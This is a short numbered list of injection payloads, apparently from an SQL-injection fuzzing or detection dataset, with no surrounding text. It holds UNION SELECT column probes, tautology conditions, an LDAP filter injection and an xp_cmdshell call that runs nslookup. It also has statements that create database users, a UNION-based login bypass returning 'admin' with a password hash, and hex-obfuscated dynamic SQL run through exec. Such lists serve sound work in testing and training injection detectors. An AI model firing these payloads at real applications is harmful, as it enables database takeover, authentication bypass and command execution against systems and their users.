1 -8159 where 2793  =  2793 union all select 2793,2793,2793,2793,2793# 
10 t'exec master..xp_cmdshell 'nslookup www.google.com'-- 
83 -4885 union all select 4589,4589,4589,4589,4589,4589,4589,4589,4589,4589# 
113 -2071 union all select 4753,4753-- 
182 -- &password  =  
205 1234 " AND 1  =  0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055 
220 *| 
281 as 
388 -4494 or 5291  =  4452 
426 insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )    
432 %2A%28%7C%28objectclass%3D%2A%29%29 
503 -8633" or 5099  =  5974 
536 " " 
555 create user name identified by 'pass123' 
601 -4817 union all select 7415,7415,7415,7415,7415,7415,7415,7415,7415# 
710 ns 
758 \x27UNION SELECT 
797 declare @s varchar  (  200  )   select @s   =   0x77616974 ... 
1087 declare @q nvarchar   (  200  )   0x730065006c00650063007400200040004000760065007200730069006f006e00 exec  (  @q  )  
1094 ^' 
